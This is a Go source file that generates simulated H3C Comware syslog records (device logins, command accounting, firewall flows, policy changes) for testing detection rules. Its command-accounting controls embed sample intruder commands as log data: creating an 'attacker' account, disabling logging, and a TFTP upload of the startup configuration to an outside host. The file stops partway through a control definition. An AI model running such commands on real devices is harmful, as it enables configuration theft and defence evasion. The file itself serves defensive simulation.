package catalog

import (
	"fmt"
	"strings"

	"github.com/theshahrukh98khan/LogGen/internal/core"
)

// H3C Comware controls, covering SecPath firewalls, Comware routers and
// Comware switches. All three run the same information centre, so they share
// one record format and one source file; the groups below keep firewall events
// apart from switching and routing events.
//
// Record format
// -------------
// Comware's information centre sends logs to a log host as:
//
//	<PRI>Timestamp Sysname %%vvModule/Level/Mnemonic: Location; Content
//
// H3C's own worked example of that, quoted verbatim from the Comware 7
// information center configuration guide:
//
//	<189>Nov 24 16:22:21 2016 Sysname %%10SHELL/5/SHELL_LOGIN: -DevIP=1.1.1.1; -SN=210235A2QYB20C000001; VTY logged in from 192.168.1.26.
//
// Field by field, from the same guide's "Log field description" table:
//
//   - %% is the vendor ID and means the record came from an H3C device.
//   - vv is the log version and is always 10. "%%10" is therefore the literal
//     marker a decoder should anchor on.
//   - Module is the generating module (SHELL, ATK, PORTSEC, OSPF, ...), Level
//     is the syslog severity 0-7, and Mnemonic is the digest, up to 32
//     characters.
//   - Location is optional and only present when "info-center loghost source"
//     or "info-center loghost locate-info with-sn" is configured. It is absent
//     by default, and absent from every example in H3C's message references, so
//     it is not emitted here.
//   - PRI uses facility local7 by default, which is what makes the <189> in
//     the example above: 23*8 + 5.
//
// Timestamp: H3C's default log-host timestamp is "Mmm dd hh:mm:ss yyyy", with
// a trailing year that plain RFC 3164 has no slot for. Comware also ships
// "info-center timestamp loghost no-year-date", documented in the same guide
// with this verbatim example:
//
//	<189>May 30 06:44:22 Sysname %%10FTPD/5/FTPD_LOGIN: User ftp (192.168.1.23) has logged in successfully.
//
// That is byte for byte what LogGen's RFC 3164 encoder produces in front of
// the payloads below, so these records model a device configured with
// no-year-date. An operator who wants the default year-bearing timestamp must
// account for the extra token in their decoder.
//
// Comware is a descendant of the same codebase as Huawei VRP, but the two have
// diverged: VRP writes "%%01MODULE/level/DIGEST:" with its own module and
// digest names and its own content wording. Nothing here is interchangeable
// with the VRP source, and the two must not be decoded by one rule.
//
// Sources
// -------
// Format and field descriptions:
//
//	https://www.h3c.com/en/d_202407/2220483_294551_0.htm
//	  (Comware 7 "Information center configuration", Log formats and field
//	  descriptions; source of both verbatim examples above)
//
// Module, severity and mnemonic names, and the content wording of every
// control below, are taken from H3C's own system log message references:
//
//	https://www.h3c.com/en/Support/Resource_Center/EN/Home/Switches/00-Public/Reference_Guides/Log_Message_References/H3C_Fixed-Port_System_Log_R66xx/
//	  "H3C Fixed-Port Switches System Log Messages Reference-R66xx-6W100"
//	  (switch and router modules: SHELL, LOGIN, SSHS, PWDCTL, RADIUS, WEB,
//	   SNMP, CFGMAN, DEV, PORTSEC, MAC, DOT1X, STP, ARP, OSPF, BGP)
//
//	https://www.h3c.com/en/Support/Resource_Center/EN/Home/Security/00-Public/Reference_Guides/Log_Message_References/H3C_Security_Products_Comware_7_System_Log_Mess-12/
//	  "H3C Security Products Comware 7 System Log Messages Reference-6W700"
//	  (SecPath modules: SESSION, ATK, IPS, OBJP, AUDIT)
//
// Confirmed against those references
// ----------------------------------
// Every Module/Level/Mnemonic triple used below, and the sentence or key list
// that follows it, is copied from the "Message text" and "Example" rows of the
// matching section in one of the two references. That includes the details
// that are easy to get wrong:
//
//   - SHELL, LOGIN, SSHS, PWDCTL, WEB, RADIUS, SNMP, CFGMAN and DEV messages
//     put a space after the colon: "SHELL/5/SHELL_LOGIN: Console logged in
//     from console0."
//   - The fast-log-output modules on the firewall do not. SESSION, ATK, IPS,
//     AUDIT and OBJP run the first key straight onto the colon:
//     "SESSION/6/SESSION_IPV4_FLOW:Protocol(1001)=UDP;..." Those records are
//     semicolon-separated key(id)=value pairs, with a trailing semicolon, and
//     the numeric field IDs are part of the key.
//   - Some modules embed a "-Key=value-Key=value;" prefix before the sentence
//     (SHELL_CMD, PORTSEC_VIOLATION, DOT1X_LOGIN_FAILURE, CFGMAN_CFGCHANGED,
//     SNMP_SET). The leading hyphen and the semicolon before the sentence are
//     both literal. PORTSEC and DOT1X run that prefix straight onto the colon
//     with no space, where SHELL puts one; the reference's own examples are
//     inconsistent between modules and this follows them module by module.
//   - The fast-log terminator is not uniform either. SESSION, IPS, AUDIT and
//     OBJP close on a semicolon; ATK closes on a full stop. Both are visible
//     in the security reference's examples.
//   - MAC addresses are written in Comware's dotted-quad-less "0010-8400-22b9"
//     form, not colon separated.
//   - ATK timestamps are BeginTime_c(1011)=YYYYMMDDHHMMSS; SESSION timestamps
//     are BeginTime_e(1013)=MMDDYYYYHHMMSS. The two are not the same layout,
//     which is visible in the references' own examples.
//
// Inferred, not confirmed
// -----------------------
//   - The facility. local7 is the default and matches the <189> in H3C's
//     example, but an operator may move it with "info-center loghost".
//   - Which modules a given platform actually carries. The references are
//     per-platform: a SecPath firewall has no PORTSEC or STP section, and a
//     fixed-port switch has no ATK or SESSION section. The groups below say
//     which device class each control belongs to, but LogGen sends them all
//     from one syslog source.
//   - Field values inside otherwise confirmed records: interface numbering,
//     VLAN IDs, policy and zone names, attack names and IDs. The keys and
//     their order come from the vendor; the values are the simulated estate.
//   - The IPS_IPV4_INTERZONE record carries far more keys than are modelled
//     here. The reference's example runs to about forty; the subset below
//     keeps the leading keys in their published order and stops shortly after
//     Action, which is where a detection rule reads.
//   - Whether CFGMAN_CFGCHANGED and SNMP_SET put a space after the colon. The
//     reference wraps both examples at exactly that point, so the space here
//     is taken from the SHELL modules, which are unambiguous.
//   - The "-MDC=n;" and "-Context=n;" prefixes. These identify a multitenant
//     context and only appear on platforms configured with one. The published
//     ARP_INSPECTION and SSHS_SCP_OPER examples carry "-MDC=1;" and are
//     rendered here without it, as a single-context device would emit them.
//     IPS_IPV4_INTERZONE keeps its "-Context=1" because that is the only form
//     the reference publishes for it.
//   - Wazuh rule IDs. Wazuh ships no H3C decoder, so no rule IDs are claimed
//     on any control in this file.

// ---------------------------------------------------------------------------
// Record assembly
// ---------------------------------------------------------------------------

// h3cVendor is the vendor ID and log version: "%%" marks an H3C device and
// "10" is the log version, which the field description table fixes at 10.
const h3cVendor = "%%10"

// h3cLog renders a conventional Comware record, where a space follows the
// colon: "%%10SHELL/5/SHELL_LOGIN: Console logged in from console0."
func h3cLog(module string, level int, mnemonic, content string) string {
	return fmt.Sprintf("%s%s/%d/%s: %s", h3cVendor, module, level, mnemonic, content)
}

// h3cLogTight renders the modules that run their first key straight onto the
// colon with no space: "%%10PORTSEC/5/PORTSEC_VIOLATION:-IfName=...".
func h3cLogTight(module string, level int, mnemonic, content string) string {
	return fmt.Sprintf("%s%s/%d/%s:%s", h3cVendor, module, level, mnemonic, content)
}

// h3cFastLog renders a fast-log-output record: no space after the colon, and
// semicolon-separated Key(id)=value pairs. term is the record terminator,
// which is not the same for every module: SESSION, IPS, AUDIT and OBJP close
// on a semicolon, ATK closes on a full stop.
func h3cFastLog(module string, level int, mnemonic string, fields []string, term string) string {
	return fmt.Sprintf("%s%s/%d/%s:%s%s", h3cVendor, module, level, mnemonic,
		strings.Join(fields, ";"), term)
}

// Record terminators for h3cFastLog.
const (
	h3cTermSemi = ";"
	h3cTermStop = "."
)

// h3cField renders one "Key(id)=value" pair of a fast-log-output record.
func h3cField(key string, id int, value string) string {
	return fmt.Sprintf("%s(%d)=%s", key, id, value)
}

// h3cPayload wraps a rendered record. The syslog severity is the same number
// as the Level in the digest, which is how Comware emits it.
func h3cPayload(c *core.Ctx, host string, level int, msg string) core.Payload {
	return core.Payload{
		Kind: core.SourceH3C,
		// No tag: the record is the whole message, and a tag would insert
		// "comware: " between the sysname and "%%10".
		Host: host,
		// local7 is the information centre's default for a log host.
		Facility: core.FacLocal7,
		Severity: level,
		Message:  msg,
	}
}

// ---------------------------------------------------------------------------
// Shared values
// ---------------------------------------------------------------------------

var (
	hUser   = param("user", "Device account", "auto")
	hSrcIP  = param("srcip", "Source IP", "auto")
	hDstIP  = param("dstip", "Destination IP", "auto")
	hIface  = param("iface", "Interface", "auto")
	hDevice = param("device", "Device sysname", "auto")
	hVLAN   = param("vlan", "VLAN ID", "auto")
	hMAC    = param("mac", "MAC address", "auto")
)

// h3cAdmin is the account a device login record names.
func h3cAdmin(c *core.Ctx) string {
	return c.P("user", c.Pick("admin", "netadmin", "noc-ops", "backup", c.User()))
}

// h3cDevice picks one of the three Comware sysnames in the estate. Device
// access and configuration events happen on all three device classes, so these
// controls rotate across them rather than pretending a firewall is the only
// thing an operator logs in to.
func h3cDevice(c *core.Ctx) string {
	return c.P("device", c.Pick(c.Env.FWHost, c.Env.SwitchHost, c.Env.RouterHost))
}

// h3cLine is a Comware user line: console0, vty0 through vty4, aux0.
func h3cLine(c *core.Ctx) string {
	return c.Pick("vty0", "vty1", "vty2", "vty3", "console0", "aux0")
}

// h3cIface renders a Comware switch interface name, which carries the IRF
// member ID in the first position.
func h3cIface(c *core.Ctx) string {
	return c.P("iface", fmt.Sprintf("%s1/0/%d",
		c.Pick("GigabitEthernet", "GigabitEthernet", "Ten-GigabitEthernet"), c.Int(1, 48)))
}

// h3cFwIface renders a SecPath interface name, which has no stack slot.
func h3cFwIface(c *core.Ctx) string {
	return c.P("iface", fmt.Sprintf("GigabitEthernet0/0/%d", c.Int(1, 8)))
}

// h3cMAC renders a MAC address the way Comware writes it: three hyphen
// separated groups of four hex digits, lower case.
func h3cMAC(c *core.Ctx) string {
	return c.P("mac", fmt.Sprintf("%s-%s-%s",
		strings.ToLower(c.Hex(4)), strings.ToLower(c.Hex(4)), strings.ToLower(c.Hex(4))))
}

// h3cVLAN returns a VLAN ID.
func h3cVLAN(c *core.Ctx) string {
	return c.P("vlan", fmt.Sprintf("%d", c.Pick1(10, 20, 30, 100, 200, 444, 500)))
}

// h3cATKTime is the timestamp layout the ATK module uses in BeginTime_c and
// EndTime_c: YYYYMMDDHHMMSS.
func h3cATKTime(c *core.Ctx) string { return c.Now.Format("20060102150405") }

// h3cSessionTime is the layout the SESSION module uses in BeginTime_e, which
// leads with the month and day and puts the year in the middle:
// MMDDYYYYHHMMSS.
func h3cSessionTime(c *core.Ctx) string { return c.Now.Format("01022006150405") }

func init() {
	registerH3CAccess()
	registerH3CConfig()
	registerH3CFirewall()
	registerH3CAttackDefence()
	registerH3CSwitching()
	registerH3CRouting()
}

// ---------------------------------------------------------------------------
// Device access
//
// Every Comware device class carries these. They are the records that say who
// got onto the box.
// ---------------------------------------------------------------------------

func registerH3CAccess() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-shell-login", Source: core.SourceH3C,
			Group: "Device access", Name: "Administrative login succeeded",
			Desc:    "SHELL_LOGIN: a user reached the Comware CLI. The successful end of a brute force, and the record that says an attacker now has the device.",
			Channel: "SHELL", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1078", "T1021.004"},
			Params: []core.Param{hDevice, hUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			// Comware names the line type here, not the account, when the
			// login came from a VTY or the console.
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("SHELL", 5, "SHELL_LOGIN",
					fmt.Sprintf("%s logged in from %s.",
						c.Pick("VTY", "Console", h3cAdmin(c)), h3cLine(c))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-login-failed", Source: core.SourceH3C,
			Group: "Device access", Name: "Login failed",
			Desc:    "LOGIN_FAILED: a login attempt against the device was rejected. Repeat it to simulate brute force against the management plane.",
			Channel: "LOGIN", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{hDevice, hUser, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("LOGIN", 5, "LOGIN_FAILED",
					fmt.Sprintf("%s failed to log in from %s.",
						h3cAdmin(c), c.P("srcip", c.ExternalIP()))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-login-invalid-credentials", Source: core.SourceH3C,
			Group: "Device access", Name: "Invalid username or password",
			Desc:    "LOGIN_INVALID_USERNAME_PWD: the credentials offered did not match an account. Distinguishes guessing at usernames from guessing at passwords.",
			Channel: "LOGIN", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110.001", "T1589.001"},
			Params: []core.Param{hDevice, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("LOGIN", 5, "LOGIN_INVALID_USERNAME_PWD",
					fmt.Sprintf("Invalid username or password from %s.",
						c.P("srcip", c.ExternalIP()))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ssh-password-failure", Source: core.SourceH3C,
			Group: "Device access", Name: "SSH password authentication failed",
			Desc:    "SSHS_AUTH_PWD_LOG: the SSH server rejected a password. Carries the client port, so a burst from one source is easy to correlate.",
			Channel: "SSHS", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110.001", "T1021.004"},
			Params: []core.Param{hDevice, hUser, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("SSHS", 6, "SSHS_AUTH_PWD_LOG",
					fmt.Sprintf("Authentication failed for user %s from %s port %d because of invalid username or wrong password.",
						h3cAdmin(c), c.P("srcip", c.ExternalIP()), c.EphemeralPort())))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ssh-retry-exceeded", Source: core.SourceH3C,
			Group: "Device access", Name: "SSH authentication attempts exceeded",
			Desc:    "SSHS_AUTH_EXCEED_RETRY_TIMES: a client used up its authentication retries. One of these is a typo; several from one address is an attack.",
			Channel: "SSHS", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{hDevice, hUser, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("SSHS", 6, "SSHS_AUTH_EXCEED_RETRY_TIMES",
					fmt.Sprintf("SSH user %s (IP: %s) failed to log in, because the number of authentication attempts exceeded the upper limit.",
						h3cAdmin(c), c.P("srcip", c.ExternalIP()))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ssh-acl-deny", Source: core.SourceH3C,
			Group: "Device access", Name: "SSH connection denied by ACL",
			Desc:    "SSH_ACL_DENY: a client outside the management ACL tried to open an SSH session. Reconnaissance of the management plane from a network that should never reach it.",
			Channel: "SSHS", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1021.004", "T1595"},
			Params: []core.Param{hDevice, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("SSHS", 5, "SSH_ACL_DENY",
					fmt.Sprintf("The SSH Connection %s request was denied according to ACL rules.",
						c.P("srcip", c.ExternalIP()))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-password-control-blacklist", Source: core.SourceH3C,
			Group: "Device access", Name: "Account added to password control blacklist",
			Desc:    "PWDCTL_ADD_BLACKLIST: password control locked an account out after repeated failures. The device's own verdict that it is under credential attack.",
			Channel: "PWDCTL", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{hDevice, hUser},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("PWDCTL", 6, "PWDCTL_ADD_BLACKLIST",
					fmt.Sprintf("%s was added to the blacklist for failed login attempts.", h3cAdmin(c))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-radius-auth-failure", Source: core.SourceH3C,
			Group: "Device access", Name: "RADIUS authentication rejected",
			Desc:    "RADIUS_AUTH_FAILURE: the RADIUS server rejected a user. Central authentication failing on a network device is worth a rule on its own.",
			Channel: "RADIUS", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110"},
			Params: []core.Param{hDevice, hUser, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("RADIUS", 5, "RADIUS_AUTH_FAILURE",
					fmt.Sprintf("User %s@system at %s failed authentication.",
						h3cAdmin(c), c.P("srcip", c.InternalIP()))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-web-login-failed", Source: core.SourceH3C,
			Group: "Device access", Name: "Web management login failed",
			Desc:    "WEB/5/LOGIN_FAILED: a failed login to the device's web interface. The web UI is often reachable from further away than SSH is.",
			Channel: "WEB", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110.001"},
			Params: []core.Param{hDevice, hUser, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("WEB", 5, "LOGIN_FAILED",
					fmt.Sprintf("%s failed to log in from %s.",
						h3cAdmin(c), c.P("srcip", c.ExternalIP()))))
		},
	})
}

// ---------------------------------------------------------------------------
// Configuration and management
// ---------------------------------------------------------------------------

func registerH3CConfig() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-shell-command", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "Command executed",
			Desc:    "SHELL_CMD: command accounting. The default set here is the commands an intruder runs: dumping the configuration, adding a local account, weakening logging.",
			Channel: "SHELL", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1059", "T1098", "T1562.001"},
			Params: []core.Param{hDevice, hUser, hSrcIP, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			cmd := c.P("command", c.Pick(
				"display current-configuration",
				"local-user attacker class manage",
				"undo info-center enable",
				"undo snmp-agent",
				"tftp 203.0.113.9 put flash:/startup.cfg",
				"user-role network-admin",
			))
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("SHELL", 6, "SHELL_CMD",
					fmt.Sprintf("-Line=%s-IPAddr=%s-User=%s; Command is %s",
						h3cLine(c), c.P("srcip", c.InternalIP()), h3cAdmin(c), cmd)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-shell-command-denied", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "Command denied by user role",
			Desc:    "SHELL_CMDDENY: an account tried a command its role does not allow. A low-privilege session probing for what it can reach is privilege escalation in progress.",
			Channel: "SHELL", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1068", "T1078"},
			Params: []core.Param{hDevice, hUser, hSrcIP, param("command", "Command", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			cmd := c.P("command", c.Pick(
				"local-user attacker class manage",
				"user-role network-admin",
				"undo info-center loghost",
				"display current-configuration",
			))
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("SHELL", 5, "SHELL_CMDDENY",
					fmt.Sprintf("-Line=%s-IPAddr=%s-User=%s; Command %s is permission denied.",
						h3cLine(c), c.P("srcip", c.InternalIP()), h3cAdmin(c), cmd)))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-config-changed", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "Running configuration changed",
			Desc:    "CFGMAN_CFGCHANGED: the device's configuration database changed. CommandSource tells you whether it came from the CLI or from SNMP, and SNMP-sourced change outside a maintenance window is the one to alert on.",
			Channel: "CFGMAN", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1601.001"},
			Params: []core.Param{hDevice, param("source", "Command source", "cli | snmp | other")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("CFGMAN", 5, "CFGMAN_CFGCHANGED",
					fmt.Sprintf("-EventIndex=%d-CommandSource=%s-ConfigSource=%s-ConfigDestination=running; Configuration changed.",
						c.Int(1, 4096),
						c.P("source", c.Pick("cli", "snmp", "other")),
						c.Pick("running", "startup", "local", "networkFtp"))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-snmp-set", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "SNMP SET received",
			Desc:    "SNMP_SET: an NMS wrote a MIB node. A write from an address that is not the management station is configuration tampering over SNMP.",
			Channel: "SNMP", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1601.001"},
			Params: []core.Param{hDevice, hSrcIP},
		},
		Build: func(c *core.Ctx) core.Payload {
			// The node and the value it was set to have to come from the same
			// entry; picking them separately would write "down" into
			// sysLocation.
			writes := [][2]string{
				{"sysLocation(1.3.6.1.2.1.1.6.0)", "Hangzhou China"},
				{"sysContact(1.3.6.1.2.1.1.4.0)", "noc@example"},
				{"ifAdminStatus(1.3.6.1.2.1.2.2.1.7.1)", "down"},
			}
			w := writes[c.Rand().Intn(len(writes))]
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("SNMP", 6, "SNMP_SET",
					fmt.Sprintf("-seqNO=%d-srcIP=%s-op=SET-errorIndex=0-errorStatus=noError-node=%s-value=%s; The agent received a message.",
						c.Int(1, 9999), c.P("srcip", c.InternalIP()), w[0], w[1])))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-snmp-auth-failure", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "SNMP authentication failure",
			Desc:    "SNMP_AUTHENTICATION_FAILURE: a request failed to authenticate to the agent. Sustained failures are community string guessing.",
			Channel: "SNMP", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1110", "T1046"},
			Params: []core.Param{hDevice},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevWarning,
				h3cLog("SNMP", 4, "SNMP_AUTHENTICATION_FAILURE",
					"Failed to authenticate SNMP message."))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-scp-file-transfer", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "SCP file operation",
			Desc:    "SSHS_SCP_OPER: an SCP client moved a file on or off the device. A get of the startup configuration is configuration theft; a put is how a backdoored image or config arrives.",
			Channel: "SSHS", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1602.002", "T1105"},
			Params: []core.Param{hDevice, hUser, hSrcIP, param("file", "File name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevInfo,
				h3cLog("SSHS", 6, "SSHS_SCP_OPER",
					fmt.Sprintf("User %s at %s requested operation: %s file \"%s\".",
						h3cAdmin(c), c.P("srcip", c.ExternalIP()),
						c.Pick("get", "put"),
						c.P("file", c.Pick("startup.cfg", "flash:/startup.cfg", "config.bak", "main.ipe")))))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-system-reboot", Source: core.SourceH3C,
			Group: "Configuration and management", Name: "System reboot",
			Desc:    "SYSTEM_REBOOT: the device is restarting. An unscheduled reboot drops every session and every log the device had not yet shipped, which makes it a defence evasion step as well as an outage.",
			Channel: "DEV", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1529", "T1562.001"},
			Params: []core.Param{hDevice},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, h3cDevice(c), core.SevNotice,
				h3cLog("DEV", 5, "SYSTEM_REBOOT", "System is rebooting now."))
		},
	})
}

// ---------------------------------------------------------------------------
// Firewall sessions and policy  (SecPath, Comware 7)
// ---------------------------------------------------------------------------

func registerH3CFirewall() {
	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-session-ipv4-flow", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "IPv4 session created",
			Desc:    "SESSION_IPV4_FLOW: the firewall's own flow record, with pre-NAT and post-NAT addresses in the same line. The baseline every other firewall rule is written against.",
			Channel: "SESSION", Severity: core.SevLabelInfo,
			Params: []core.Param{hSrcIP, hDstIP, param("dport", "Destination port", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			// Generate each address once: the NAT keys repeat them, and a
			// second call would quietly produce a record that contradicts
			// itself.
			src := c.P("srcip", c.InternalIP())
			dst := c.P("dstip", c.ExternalIP())
			sport := c.EphemeralPort()
			dport := c.PInt("dport", c.WellKnownPort())
			natSrc := c.ExternalIP()
			return h3cPayload(c, c.Env.FWHost, core.SevInfo,
				h3cFastLog("SESSION", 6, "SESSION_IPV4_FLOW", []string{
					h3cField("Protocol", 1001, "TCP"),
					h3cField("Application", 1002, h3cApp(c, dport)),
					h3cField("Category", 1174, "General"),
					h3cField("SrcIPAddr", 1003, src),
					h3cField("SrcPort", 1004, fmt.Sprintf("%d", sport)),
					h3cField("NATSrcIPAddr", 1005, natSrc),
					h3cField("NATSrcPort", 1006, fmt.Sprintf("%d", c.EphemeralPort())),
					h3cField("DstIPAddr", 1007, dst),
					h3cField("DstPort", 1008, fmt.Sprintf("%d", dport)),
					h3cField("NATDstIPAddr", 1009, dst),
					h3cField("NATDstPort", 1010, fmt.Sprintf("%d", dport)),
					h3cField("InitPktCount", 1044, fmt.Sprintf("%d", c.Packets())),
					h3cField("InitByteCount", 1046, fmt.Sprintf("%d", c.Bytes())),
					h3cField("RplyPktCount", 1045, fmt.Sprintf("%d", c.Packets())),
					h3cField("RplyByteCount", 1047, fmt.Sprintf("%d", c.Bytes())),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("SndVPNInstance", 1043, ""),
					h3cField("RcvDSLiteTunnelPeer", 1040, ""),
					h3cField("SndDSLiteTunnelPeer", 1041, ""),
					h3cField("BeginTime_e", 1013, h3cSessionTime(c)),
					h3cField("EndTime_e", 1014, ""),
					h3cField("Event", 1048, "(8)Session created"),
				}, h3cTermSemi))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-deny-session-ipv4-flow", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "IPv4 session denied",
			Desc:    "DENY_SESSION_IPV4_FLOW: traffic the security policy dropped. A run of these from one source against sequential ports is a scan the policy happened to stop.",
			Channel: "SESSION", Severity: core.SevLabelMedium,
			Mitre:  []string{"T1046", "T1190"},
			Params: []core.Param{hSrcIP, hDstIP, param("dport", "Destination port", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			src := c.P("srcip", c.ExternalIP())
			dst := c.P("dstip", c.InternalIP())
			sport := c.EphemeralPort()
			dport := c.PInt("dport", c.Pick1(22, 23, 445, 3389, 1433))
			return h3cPayload(c, c.Env.FWHost, core.SevInfo,
				h3cFastLog("SESSION", 6, "DENY_SESSION_IPV4_FLOW", []string{
					h3cField("Protocol", 1001, "TCP"),
					h3cField("Application", 1002, h3cApp(c, dport)),
					h3cField("Category", 1174, "General"),
					h3cField("SrcIPAddr", 1003, src),
					h3cField("SrcPort", 1004, fmt.Sprintf("%d", sport)),
					h3cField("NATSrcIPAddr", 1005, src),
					h3cField("NATSrcPort", 1006, fmt.Sprintf("%d", sport)),
					h3cField("DstIPAddr", 1007, dst),
					h3cField("DstPort", 1008, fmt.Sprintf("%d", dport)),
					h3cField("NATDstIPAddr", 1009, dst),
					h3cField("NATDstPort", 1010, fmt.Sprintf("%d", dport)),
					h3cField("InitPktCount", 1044, "1"),
					h3cField("InitByteCount", 1046, fmt.Sprintf("%d", c.Int(40, 120))),
					h3cField("RplyPktCount", 1045, "0"),
					h3cField("RplyByteCount", 1047, "0"),
					h3cField("RcvVPNInstance", 1042, ""),
					h3cField("SndVPNInstance", 1043, ""),
					h3cField("RcvDSLiteTunnelPeer", 1040, ""),
					h3cField("SndDSLiteTunnelPeer", 1041, ""),
					h3cField("BeginTime_e", 1013, h3cSessionTime(c)),
					h3cField("EndTime_e", 1014, ""),
					h3cField("Event", 1048, "(8)Session created"),
				}, h3cTermSemi))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-object-policy-rule-created", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "Security policy rule created",
			Desc:    "OBJP_RULE_CREATE_SUCCESS: an object policy rule was added. A new permit rule between zones is the change that opens a path, and it belongs in a change-control correlation.",
			Channel: "OBJP", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.004", "T1601.001"},
			Params: []core.Param{param("rule", "Rule name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.FWHost, core.SevInfo,
				h3cFastLog("OBJP", 6, "OBJP_RULE_CREATE_SUCCESS", []string{
					h3cField("RuleName", 1080, c.P("rule", c.Pick(
						"untrust-trust", "untrust-dmz", "trust-untrust", "any-any"))),
					h3cField("Type", 1067, "IPv4"),
					h3cField("Action", 1053, "Permit"),
				}, h3cTermSemi))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-object-policy-rule-deleted", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "Security policy rule deleted",
			Desc:    "OBJP_RULE_DELETE_SUCCESS: an object policy rule was removed. Deleting a deny rule is how an estate is quietly opened up.",
			Channel: "OBJP", Severity: core.SevLabelHigh,
			Mitre:  []string{"T1562.004"},
			Params: []core.Param{param("rule", "Rule name", "auto")},
		},
		Build: func(c *core.Ctx) core.Payload {
			return h3cPayload(c, c.Env.FWHost, core.SevInfo,
				h3cFastLog("OBJP", 6, "OBJP_RULE_DELETE_SUCCESS", []string{
					h3cField("RuleName", 1080, c.P("rule", c.Pick(
						"block-rdp-inbound", "untrust-dmz", "deny-any-any", "block-smb"))),
					h3cField("Type", 1067, "IPv4"),
					h3cField("Action", 1053, "Deny"),
				}, h3cTermSemi))
		},
	})

	Register(core.Definition{
		Control: core.Control{
			ID: "h3c-ips-interzone", Source: core.SourceH3C,
			Group: "Firewall sessions and policy", Name: "IPS signature hit",
			Desc:    "IPS_IPV4_INTERZONE: the IPS engine matched a signature on traffic crossing zones. Carries the attack name, ID, severity and the action taken.",
			Channel: "IPS", Severity: core.SevLabelCritical,
			Mitre:  []string{"T1190"},
			Params: []core.Param{hSrcIP, hDstIP, param("attack", "Attack name", "auto")},
		},
